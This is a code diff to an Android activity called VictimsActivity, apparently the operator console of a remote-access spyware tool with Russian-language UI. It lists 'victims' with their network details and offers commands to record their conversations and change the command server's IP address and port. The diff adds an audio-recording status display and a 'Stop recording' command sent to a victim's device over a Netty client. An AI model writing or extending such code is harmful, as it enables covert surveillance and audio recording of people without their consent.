@@ -108,6 +108,7 @@ public class VictimsActivity extends AppCompatActivity {
         String netType = (String) info.get("netType");
         String netName = (String) info.get("netName");
         String netSubtype = (String) info.get("netSubtype");
+        boolean recordAudio = (boolean) info.get("audioRecord");
 
         LayoutInflater layoutInflater = LayoutInflater.from(this);
         final View infoView = layoutInflater.inflate(R.layout.view_victiminfo, null);
@@ -123,6 +124,7 @@ public class VictimsActivity extends AppCompatActivity {
         TextView netTypeTextView = (TextView) infoView.findViewById(R.id.netTypeTextView);
         TextView netNameTextView = (TextView) infoView.findViewById(R.id.netNameTextView);
         TextView netSubtypeTextView = (TextView) infoView.findViewById(R.id.netSubtypeTextView);
+        TextView audioRecordTextView = (TextView) infoView.findViewById(R.id.recordAudioTextView);
 
 
         victimTextView.setText("Жертва: " + victim);
@@ -133,6 +135,7 @@ public class VictimsActivity extends AppCompatActivity {
         netTypeTextView.setText("Тип инета: " + netType);
         netNameTextView.setText("Имя инета: " + netName);
         netSubtypeTextView.setText("Тип сети: " + netSubtype);
+        audioRecordTextView.setText("Запись аудио: " + recordAudio);
 
         alertDialogBuilder.setCancelable(false);
         alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
@@ -191,6 +194,7 @@ public class VictimsActivity extends AppCompatActivity {
         menu.add("Информация");
         menu.add("Последний онлайн");
         menu.add("Запись разговора");
+        menu.add("Остановить запись");
         menu.add("Изменить имя");
         menu.add("Изменить IP_ADDRESS");
         menu.add("Изменить SERVER_PORT");
@@ -239,6 +243,9 @@ public class VictimsActivity extends AppCompatActivity {
 
                 alertDialogBuilder.create();
                 alertDialogBuilder.show();
+                break;
+            case "Остановить запись":
+                NettyClient.getInstance().sendStopAudioRecord(victim);
                 break;
             case "Изменить имя":
                 layoutInflater = LayoutInflater.from(this);
